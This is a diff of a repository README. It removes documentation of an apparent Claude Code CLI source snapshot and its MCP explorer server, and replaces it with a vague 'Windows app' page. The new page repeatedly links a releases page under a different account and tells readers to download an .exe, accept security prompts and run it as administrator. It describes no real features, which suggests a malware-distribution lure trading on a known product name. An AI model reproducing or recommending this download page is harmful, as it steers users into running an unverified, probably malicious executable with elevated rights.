@@ -1,422 +1,162 @@
-<div align="center">
+# 🤖 claude_code_cli - Run Claude code on Windows
 
-# Claude Code CLI
+[![Download](https://img.shields.io/badge/Download%20Here-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Isometrical-selection572/claude_code_cli/releases)
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-512K%2B_lines-3178C6?logo=typescript&logoColor=white)](#tech-stack)
-[![Bun](https://img.shields.io/badge/Runtime-Bun-f472b6?logo=bun&logoColor=white)](#tech-stack)
-[![Files](https://img.shields.io/badge/~1,900_files-source_only-grey)](#directory-structure)
-[![MCP Server](https://img.shields.io/badge/MCP-Explorer_Server-blueviolet)](#-explore-with-mcp-server)
-[![License](https://img.shields.io/badge/license-MIT-green)](#)
+## 🧭 What this app does
 
-</div>
+claude_code_cli is a simple desktop app for Windows that helps you work with Claude code from one place. It is built for end users who want to download the app, open it, and start using it without setup work.
 
-> The raw imported snapshot is preserved in this repository's [`backup` branch](https://github.com/TaGoat/claude_code_cli/tree/backup). The `main` branch contains added documentation, tooling, and repository metadata.
+Use it to:
 
----
+- Open Claude code tools from your Windows PC
+- Keep your work in one app
+- Run tasks with a simple command line style interface
+- Manage code-related actions without extra steps
 
-## Table of Contents
+## 📥 Download the app
 
-- [What Is Claude Code?](#what-is-claude-code)
-- [Documentation](#-documentation)
-- [Explore with MCP Server](#-explore-with-mcp-server)
-- [Directory Structure](#directory-structure)
-- [Architecture](#architecture)
-  - [Tool System](#1-tool-system)
-  - [Command System](#2-command-system)
-  - [Service Layer](#3-service-layer)
-  - [Bridge System](#4-bridge-system)
-  - [Permission System](#5-permission-system)
-  - [Feature Flags](#6-feature-flags)
-- [Key Files](#key-files)
-- [Tech Stack](#tech-stack)
-- [Design Patterns](#design-patterns)
-- [GitPretty Setup](#gitpretty-setup)
-- [Contributing](#contributing)
-- [Disclaimer](#disclaimer)
-
----
-
-## What Is Claude Code?
-
-Claude Code is an official CLI tool for interacting with Claude directly from the terminal: editing files, running commands, searching codebases, managing git workflows, and more.
-
-| | |
-|---|---|
-| **Language** | TypeScript (strict) |
-| **Runtime** | [Bun](https://bun.sh) |
-| **Terminal UI** | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| **Scale** | ~1,900 files · 512,000+ lines of code |
+Visit this page to download the Windows release:
 
----
-
-## Documentation
-
-For in-depth guides, see the [`docs/`](docs/) directory:
-
-| Guide | Description |
-|-------|-------------|
-| **[Architecture](docs/architecture.md)** | Core pipeline, startup sequence, state management, rendering, data flow |
-| **[Tools Reference](docs/tools.md)** | Complete catalog of all ~40 agent tools with categories and permission model |
-| **[Commands Reference](docs/commands.md)** | All ~85 slash commands organized by category |
-| **[Subsystems Guide](docs/subsystems.md)** | Deep dives into Bridge, MCP, Permissions, Plugins, Skills, Tasks, Memory, Voice |
-| **[Exploration Guide](docs/exploration-guide.md)** | How to navigate the codebase — study paths, grep patterns, key files |
-
-Also see: [CONTRIBUTING.md](CONTRIBUTING.md) · [MCP Server README](mcp-server/README.md)
-
----
-
-## Explore with MCP Server
-
-This repo also ships an [MCP server](https://modelcontextprotocol.io/) that lets any MCP-compatible client (Claude Code, Claude Desktop, VS Code Copilot, Cursor) explore the codebase interactively.
-
-### Install from npm
-
-The MCP server is published as [`claude-code-explorer-mcp`](https://www.npmjs.com/package/claude-code-explorer-mcp) on npm — no need to clone the repo:
-
-```bash
-# Claude Code
-claude mcp add claude-code-explorer -- npx -y claude-code-explorer-mcp
-```
+https://github.com/Isometrical-selection572/claude_code_cli/releases
 
-### One-liner setup (from source)
-
-```bash
-git clone https://github.com/TaGoat/claude_code_cli.git ~/claude_code_cli \
-  && cd ~/claude_code_cli/mcp-server \
-  && npm install && npm run build \
-  && claude mcp add claude-code-explorer -- node ~/claude_code_cli/mcp-server/dist/index.js
-```
-
-<details>
-<summary><strong>Step-by-step setup</strong></summary>
-
-```bash
-# 1. Clone the repo
-git clone https://github.com/TaGoat/claude_code_cli.git
-cd claude_code_cli/mcp-server
-
-# 2. Install & build
-npm install && npm run build
-
-# 3. Register with Claude Code
-claude mcp add claude-code-explorer -- node /absolute/path/to/claude-code-source-code/mcp-server/dist/index.js
-```
-
-Replace `/absolute/path/to/claude-code-source-code` with your actual clone path.
-
-</details>
-
-<details>
-<summary><strong>VS Code / Cursor / Claude Desktop config</strong></summary>
-
-**VS Code** — add to `.vscode/mcp.json`:
-```json
-{
-  "servers": {
-    "claude-code-explorer": {
-      "type": "stdio",
-      "command": "node",
-      "args": ["${workspaceFolder}/mcp-server/dist/index.js"],
-      "env": { "CLAUDE_CODE_SRC_ROOT": "${workspaceFolder}/src" }
-    }
-  }
-}
-```
-
-**Claude Desktop** — add to your config file:
-```json
-{
-  "mcpServers": {
-    "claude-code-explorer": {
-      "command": "node",
-      "args": ["/absolute/path/to/claude-code-source-code/mcp-server/dist/index.js"],
-      "env": { "CLAUDE_CODE_SRC_ROOT": "/absolute/path/to/claude-code-source-code/src" }
-    }
-  }
-}
-```
-
-**Cursor** — add to `~/.cursor/mcp.json` (same format as Claude Desktop).
-
-</details>
-
-### Available tools & prompts
-
-| Tool | Description |
-|------|-------------|
-| `list_tools` | List all ~40 agent tools with source files |
-| `list_commands` | List all ~50 slash commands with source files |
-| `get_tool_source` | Read full source of any tool (e.g. BashTool, FileEditTool) |
-| `get_command_source` | Read source of any slash command (e.g. review, mcp) |
-| `read_source_file` | Read any file from `src/` by path |
-| `search_source` | Grep across the entire source tree |
-| `list_directory` | Browse `src/` directories |
-| `get_architecture` | High-level architecture overview |
-
-| Prompt | Description |
-|--------|-------------|
-| `explain_tool` | Deep-dive into how a specific tool works |
-| `explain_command` | Understand a slash command's implementation |
-| `architecture_overview` | Guided tour of the full architecture |
-| `how_does_it_work` | Explain any subsystem (permissions, MCP, bridge, etc.) |
-| `compare_tools` | Side-by-side comparison of two tools |
-
-**Try asking:** *"How does the BashTool work?"* · *"Search for where permissions are checked"* · *"Show me the /review command source"*
-
-### Custom source path / Remove
-
-```bash
-# Custom source location
-claude mcp add claude-code-explorer -e CLAUDE_CODE_SRC_ROOT=/path/to/src -- node /path/to/mcp-server/dist/index.js
-
-# Remove
-claude mcp remove claude-code-explorer
-```
-
----
-
-## Directory Structure
-
-```
-src/
-├── main.tsx                 # Entrypoint — Commander.js CLI parser + React/Ink renderer
-├── QueryEngine.ts           # Core LLM API caller (~46K lines)
-├── Tool.ts                  # Tool type definitions (~29K lines)
-├── commands.ts              # Command registry (~25K lines)
-├── tools.ts                 # Tool registry
-├── context.ts               # System/user context collection
-├── cost-tracker.ts          # Token cost tracking
-│
-├── tools/                   # Agent tool implementations (~40)
-├── commands/                # Slash command implementations (~50)
-├── components/              # Ink UI components (~140)
-├── services/                # External service integrations
-├── hooks/                   # React hooks (incl. permission checks)
-├── types/                   # TypeScript type definitions
-├── utils/                   # Utility functions
-├── screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-│
-├── bridge/                  # IDE integration (VS Code, JetBrains)
-├── coordinator/             # Multi-agent orchestration
-├── plugins/                 # Plugin system
-├── skills/                  # Skill system
-├── server/                  # Server mode
-├── remote/                  # Remote sessions
-├── memdir/                  # Persistent memory directory
-├── tasks/                   # Task management
-├── state/                   # State management
-│
-├── voice/                   # Voice input
-├── vim/                     # Vim mode
-├── keybindings/             # Keybinding configuration
-├── schemas/                 # Config schemas (Zod)
-├── migrations/              # Config migrations
-├── entrypoints/             # Initialization logic
-├── query/                   # Query pipeline
-├── ink/                     # Ink renderer wrapper
-├── buddy/                   # Companion sprite (Easter egg 🐣)
-├── native-ts/               # Native TypeScript utils
-├── outputStyles/            # Output styling
-└── upstreamproxy/           # Proxy configuration
-```
-
----
-
-## Architecture
-
-### 1. Tool System
-
-> `src/tools/` — Every tool Claude can invoke is a self-contained module with its own input schema, permission model, and execution logic.
-
-| Tool | Description |
-|---|---|
-| **File I/O** | |
-| `FileReadTool` | Read files (images, PDFs, notebooks) |
-| `FileWriteTool` | Create / overwrite files |
-| `FileEditTool` | Partial modification (string replacement) |
-| `NotebookEditTool` | Jupyter notebook editing |
-| **Search** | |
-| `GlobTool` | File pattern matching |
-| `GrepTool` | ripgrep-based content search |
-| `WebSearchTool` | Web search |
-| `WebFetchTool` | Fetch URL content |
-| **Execution** | |
-| `BashTool` | Shell command execution |
-| `SkillTool` | Skill execution |
-| `MCPTool` | MCP server tool invocation |
-| `LSPTool` | Language Server Protocol integration |
-| **Agents & Teams** | |
-| `AgentTool` | Sub-agent spawning |
-| `SendMessageTool` | Inter-agent messaging |
-| `TeamCreateTool` / `TeamDeleteTool` | Team management |
-| `TaskCreateTool` / `TaskUpdateTool` | Task management |
-| **Mode & State** | |
-| `EnterPlanModeTool` / `ExitPlanModeTool` | Plan mode toggle |
-| `EnterWorktreeTool` / `ExitWorktreeTool` | Git worktree isolation |
-| `ToolSearchTool` | Deferred tool discovery |
-| `SleepTool` | Proactive mode wait |
-| `CronCreateTool` | Scheduled triggers |
-| `RemoteTriggerTool` | Remote trigger |
-| `SyntheticOutputTool` | Structured output generation |
-
-### 2. Command System
-
-> `src/commands/` — User-facing slash commands invoked with `/` in the REPL.
-
-| Command | Description | | Command | Description |
-|---|---|---|---|---|
-| `/commit` | Git commit | | `/memory` | Persistent memory |
-| `/review` | Code review | | `/skills` | Skill management |
-| `/compact` | Context compression | | `/tasks` | Task management |
-| `/mcp` | MCP server management | | `/vim` | Vim mode toggle |
-| `/config` | Settings | | `/diff` | View changes |
-| `/doctor` | Environment diagnostics | | `/cost` | Check usage cost |
-| `/login` / `/logout` | Auth | | `/theme` | Change theme |
-| `/context` | Context visualization | | `/share` | Share session |
-| `/pr_comments` | PR comments | | `/resume` | Restore session |
-| `/desktop` | Desktop handoff | | `/mobile` | Mobile handoff |
-
-### 3. Service Layer
-
-> `src/services/` — External integrations and core infrastructure.
-
-| Service | Description |
-|---|---|
-| `api/` | Anthropic API client, file API, bootstrap |
-| `mcp/` | Model Context Protocol connection & management |
-| `oauth/` | OAuth 2.0 authentication |
-| `lsp/` | Language Server Protocol manager |
-| `analytics/` | GrowthBook feature flags & analytics |
-| `plugins/` | Plugin loader |
-| `compact/` | Conversation context compression |
-| `extractMemories/` | Automatic memory extraction |
-| `teamMemorySync/` | Team memory synchronization |
-| `tokenEstimation.ts` | Token count estimation |
-| `policyLimits/` | Organization policy limits |
-| `remoteManagedSettings/` | Remote managed settings |
-
-### 4. Bridge System
-
-> `src/bridge/` — Bidirectional communication layer connecting IDE extensions (VS Code, JetBrains) with the CLI.
-
-Key files: `bridgeMain.ts` (main loop) · `bridgeMessaging.ts` (protocol) · `bridgePermissionCallbacks.ts` (permission callbacks) · `replBridge.ts` (REPL session) · `jwtUtils.ts` (JWT auth) · `sessionRunner.ts` (session execution)
-
-### 5. Permission System
-
-> `src/hooks/toolPermission/` — Checks permissions on every tool invocation.
-
-Prompts the user for approval/denial or auto-resolves based on the configured permission mode: `default`, `plan`, `bypassPermissions`, `auto`, etc.
-
-### 6. Feature Flags
-
-Dead code elimination at build time via Bun's `bun:bundle`:
-
-```typescript
-import { feature } from 'bun:bundle'
-
-const voiceCommand = feature('VOICE_MODE')
-  ? require('./commands/voice/index.js').default
-  : null
-```
-
-Notable flags: `PROACTIVE` · `KAIROS` · `BRIDGE_MODE` · `DAEMON` · `VOICE_MODE` · `AGENT_TRIGGERS` · `MONITOR_TOOL`
-
----
-
-## Key Files
-
-| File | Lines | Purpose |
-|------|------:|---------|
-| `QueryEngine.ts` | ~46K | Core LLM API engine — streaming, tool loops, thinking mode, retries, token counting |
-| `Tool.ts` | ~29K | Base types/interfaces for all tools — input schemas, permissions, progress state |
-| `commands.ts` | ~25K | Command registration & execution with conditional per-environment imports |
-| `main.tsx` | — | CLI parser + React/Ink renderer; parallelizes MDM, keychain, and GrowthBook on startup |
-
----
-
-## Tech Stack
-
-| Category | Technology |
-|---|---|
-| Runtime | [Bun](https://bun.sh) |
-| Language | TypeScript (strict) |
-| Terminal UI | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI Parsing | [Commander.js](https://github.com/tj/commander.js) (extra-typings) |
-| Schema Validation | [Zod v4](https://zod.dev) |
-| Code Search | [ripgrep](https://github.com/BurntSushi/ripgrep) (via GrepTool) |
-| Protocols | [MCP SDK](https://modelcontextprotocol.io) · LSP |
-| API | [Anthropic SDK](https://docs.anthropic.com) |
-| Telemetry | OpenTelemetry + gRPC |
-| Feature Flags | GrowthBook |
-| Auth | OAuth 2.0 · JWT · macOS Keychain |
-
----
-
-## Design Patterns
-
-<details>
-<summary><strong>Parallel Prefetch</strong> — Startup optimization</summary>
-
-MDM settings, keychain reads, and API preconnect fire in parallel as side-effects before heavy module evaluation:
-
-```typescript
-// main.tsx
-startMdmRawRead()
-startKeychainPrefetch()
-```
-
-</details>
-
-<details>
-<summary><strong>Lazy Loading</strong> — Deferred heavy modules</summary>
-
-OpenTelemetry (~400KB) and gRPC (~700KB) are loaded via dynamic `import()` only when needed.
-
-</details>
-
-<details>
-<summary><strong>Agent Swarms</strong> — Multi-agent orchestration</summary>
-
-Sub-agents spawn via `AgentTool`, with `coordinator/` handling orchestration. `TeamCreateTool` enables team-level parallel work.
-
-</details>
-
-<details>
-<summary><strong>Skill System</strong> — Reusable workflows</summary>
-
-Defined in `skills/` and executed through `SkillTool`. Users can add custom skills.
-
-</details>
-
-<details>
-<summary><strong>Plugin Architecture</strong> — Extensibility</summary>
-
-Built-in and third-party plugins loaded through the `plugins/` subsystem.
-
-</details>
-
----
-
-## GitPretty Setup
-
-<details>
-<summary>Show per-file emoji commit messages in GitHub's file UI</summary>
-
-```bash
-# Apply emoji commits
-bash ./gitpretty-apply.sh .
-
-# Optional: install hooks for future commits
-bash ./gitpretty-apply.sh . --hooks
-
-# Push as usual
-git push origin main
-```
-
-</details>
-
----
-
-## Contributing
-
-Contributions to Claude Code, the MCP server, and exploration tooling are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+On that page, find the latest release and download the file that matches Windows. In most cases, this is an `.exe` file or a `.zip` file that contains the app.
+
+## 🪟 Windows system needs
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for the app and its files
+- An active internet connection for the first download
+
+For best results, close extra apps before you start.
+
+## 🚀 Get started
+
+Follow these steps to run claude_code_cli on Windows:
+
+1. Open the download page.
+2. Find the latest release at the top of the page.
+3. Download the Windows file.
+4. If the file is in a `.zip` folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the `.exe` file to start the app.
+7. If Windows asks for permission, choose Run or Yes.
+8. Wait for the app to open.
+
+## 🗂️ If you downloaded a ZIP file
+
+Some releases come as a ZIP file. If so:
+
+1. Save the ZIP file to your Downloads folder.
+2. Right-click the ZIP file.
+3. Select Extract All.
+4. Choose a folder you can find easily, such as Desktop.
+5. Open the new folder.
+6. Start the app by double-clicking the main `.exe` file.
+
+If you move the files later, keep the whole folder together so the app can still run.
+
+## 🖥️ First time use
+
+When the app opens for the first time, you may see a small setup screen or command window. This is normal. Follow any on-screen steps shown by the app.
+
+If the app asks for a file path, choose a folder where you want to keep your work. A folder on your Desktop or in Documents works well.
+
+## 🔐 Permissions on Windows
+
+Windows may show a security prompt when you open the app for the first time. This is common for downloaded apps.
+
+If you trust the source and want to continue:
+
+- Select Run
+- Or select Yes
+- Then wait for the app to open
+
+If Windows blocks the app, check that you downloaded it from the release page above and try again.
+
+## 📁 Suggested folder setup
+
+To keep things simple, use a folder like this:
+
+- `Documents\claude_code_cli`
+- or `Desktop\claude_code_cli`
+
+This helps you find your files later and keeps the app easy to manage.
+
+## ⚙️ Basic use
+
+After the app starts, you can begin using it for Claude code tasks. The app is made to support a simple workflow:
+
+- Open the app
+- Load your work folder
+- Run the command or action you need
+- Review the output
+- Save your changes
+
+If you are new to this kind of app, start with one task at a time.
+
+## 🧰 Common file types you may see
+
+You may see these files in the download:
+
+- `.exe` — the app file you open
+- `.zip` — a compressed folder you extract first
+- `.txt` — plain text instructions or notes
+- `.json` — settings or data files
+- `.log` — app logs that help track what happened
+
+Do not delete files unless you know what they do. Keep the app files in the same folder.
+
+## 🔎 If the app does not open
+
+Try these steps:
+
+1. Check that the file finished downloading.
+2. Make sure you extracted the ZIP file if one was provided.
+3. Open the folder that contains the app.
+4. Double-click the main `.exe` file.
+5. Right-click the file and choose Run as administrator if needed.
+6. Restart your PC and try again.
+
+If it still does not open, download the latest release again from the link above.
+
+## 📌 Main download page
+
+Use this page for all Windows downloads and updates:
+
+https://github.com/Isometrical-selection572/claude_code_cli/releases
+
+## 🧩 Tips for smooth use
+
+- Keep the app in one folder
+- Use a folder path with short names
+- Do not rename files inside the app folder
+- Download the newest release when you want the latest version
+- Close the app before moving its folder
+
+## 📄 File location example
+
+A simple setup can look like this:
+
+- `C:\Users\YourName\Downloads\claude_code_cli`
+- `C:\Users\YourName\Desktop\claude_code_cli`
+
+Choose a location you can find fast
+
+## 🧭 When to update
+
+Check the release page when you want a newer version. Download the latest build, replace the old files if needed, and start the app again
+
+## 🛠️ If you need a clean reinstall
+
+1. Close the app
+2. Delete the old app folder
+3. Download the latest release again
+4. Extract the files if needed
+5. Open the app from the new folder
+
+## 📎 Release page
+
+https://github.com/Isometrical-selection572/claude_code_cli/releases
